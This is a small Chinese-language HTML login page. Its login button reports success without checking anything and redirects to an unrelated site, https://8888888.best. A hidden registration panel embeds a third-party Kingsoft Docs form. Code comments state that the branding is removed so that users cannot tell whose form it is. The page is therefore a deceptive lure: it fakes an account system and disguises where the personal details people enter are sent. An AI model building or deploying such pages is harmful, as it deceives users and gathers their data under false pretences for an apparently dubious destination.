<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>账号登录</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            min-height:100vh;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            display:flex;align-items:center;justify-content:center;
            font-family:"Microsoft Yahei",sans-serif;
        }
        .login-box{
            background:#fff;padding:40px;border-radius:20px;
            width:90%;max-width:460px;box-shadow:0 10px 40px rgba(0,0,0,0.15);
        }
        h2{text-align:center;margin-bottom:30px;color:#222;font-weight:600;}
        .item{margin-bottom:20px;}
        label{display:block;margin-bottom:8px;color:#555;font-size:15px;}
        input{
            width:100%;padding:14px 16px;border:1px solid #ddd;
            border-radius:8px;font-size:16px;outline:none;
        }
        input:focus{border-color:#667eea;}
        .login-btn{
            width:100%;padding:15px;border:none;border-radius:8px;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            color:white;font-size:17px;cursor:pointer;
        }

        /* 注册面板默认隐藏 */
        .reg-layer{
            display:none;
            margin-top:20px;
        }
        /* 内嵌表单，去掉所有金山标识 */
        .reg-iframe{
            width:100%;
            height:420px;
            border:none;
            border-radius:10px;
        }
        .toggle{
            text-align:center;margin-top:20px;
            font-size:15px;color:#666;
        }
        .toggle a{color:#667eea;text-decoration:none;cursor:pointer;}
    </style>
</head>

<body>
<div class="login-box">
    <h2>账号登录</h2>

    <div class="item">
        <label>账号</label>
        <input type="text" placeholder="手机号/用户名">
    </div>
    <div class="item">
        <label>密码</label>
        <input type="password" placeholder="请输入密码">
    </div>

    <button class="login-btn" onclick="alert('登录成功');location.href='https://8888888.best/index.html'">
        立即登录
    </button>

    <div class="toggle">
        <a onclick="showReg()">还没有账号？立即注册</a>
    </div>

    <!-- 内嵌注册表单（用户看不出是金山） -->
    <div class="reg-layer" id="regBox">
        <iframe class="reg-iframe" src="https://f.kdocs.cn/g/dlLFQoSv/"></iframe>
    </div>
</div>

<script>
function showReg(){
    document.getElementById('regBox').style.display = 'block';
}
</script>
</body>
</html>
